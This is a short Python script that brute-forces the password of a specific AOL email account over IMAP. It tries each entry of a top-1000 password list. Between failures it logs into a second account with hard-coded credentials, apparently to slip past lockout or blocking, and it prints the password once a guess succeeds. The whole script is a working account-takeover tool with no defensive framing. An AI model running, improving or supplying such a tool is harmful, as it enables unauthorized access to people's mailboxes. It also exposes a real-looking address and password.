import imaplib

# A valid user, needed for re-whitelisting
valid_user = 'valid.amm@aol.com'
valid_pass = '123456192'

# Target user
target_user = 'ahmad.amm@aol.com'

# IMAP Settings
host = "imap.aol.com"
port = 993


def read_file_lines(file_path):
    with open(file_path) as fp:
        return fp.readlines()

# Password List
password_list = read_file_lines('top-1000-password.txt')


# IMAP Auth
def auth(username, password):
    try:
        server = imaplib.IMAP4_SSL(host, port)
        return server.login(username, password)
    except Exception as e:
        return ['No', e]



login_with_valid_acc = False
found = False
for password in password_list:
    password = password.rstrip('\n')
    try:
        if login_with_valid_acc:
            auth(valid_user, valid_pass)
            login_with_valid_acc = False

        response = auth(target_user, password)

        if response[0] == 'OK':
            found = True

        if found:
            print('#' * 50)
            print('[+] Success: {} => {}'.format(target_user, password))
            print('#' * 50)
            break
        else:
            print('[-] {} : {} => {}'.format(response[1], target_user, password))
            login_with_valid_acc = True
    except Exception as e:
        print(e)
